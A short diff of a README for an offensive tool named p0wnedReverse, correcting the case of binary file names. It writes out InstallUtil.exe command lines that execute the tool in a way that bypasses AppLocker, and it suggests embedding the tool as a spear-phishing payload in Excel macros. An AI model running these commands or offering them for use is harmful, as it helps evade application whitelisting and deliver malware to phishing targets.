@@ -47,7 +47,7 @@ To run as x86 binary and bypass Applocker (Credits for this great bypass go to C
 ```
 cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
 
-InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReversex86.exe
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReverseX86.exe
 ```
 
 To run as x64 binary and bypass Applocker:
@@ -55,7 +55,7 @@ To run as x64 binary and bypass Applocker:
 ```
 cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
 
-InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReversex64.exe
+InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedReverse\p0wnedReverseX64.exe
 ```
 
 You could also use p0wnedReverse as a Payload for Spear Phishing Campaigns by embedding it into Excel Macro's e.g.
